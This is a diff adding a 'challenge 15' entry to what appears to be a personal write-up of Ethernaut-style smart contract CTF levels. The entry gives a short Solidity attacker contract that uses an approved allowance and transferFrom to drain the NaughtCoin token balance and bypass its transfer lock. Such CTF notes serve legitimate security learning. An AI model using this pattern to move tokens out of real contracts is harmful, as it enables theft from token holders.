@@ -123,3 +123,17 @@ pretty easy to read out the storage.
 
 for whatever reason metamask would change my input data which took me one hour to figure out. works with remix.
 
+### challenge 15
+
+create smartcontract and give it the allowance for all tokens. then run the attacker contract below.
+
+```
+contract Attacker {
+    function attack(address _address) public {
+        address me =    0xD0eba5f813cEfa1FD5f60E11feCD84f39a9dDA88;
+        address other = 0xEd6715D2172BFd50C2DBF608615c2AB497904803;
+        NaughtCoin nc = NaughtCoin(_address);
+        nc.transferFrom(me, other, nc.balanceOf(me));
+    }
+}
+```
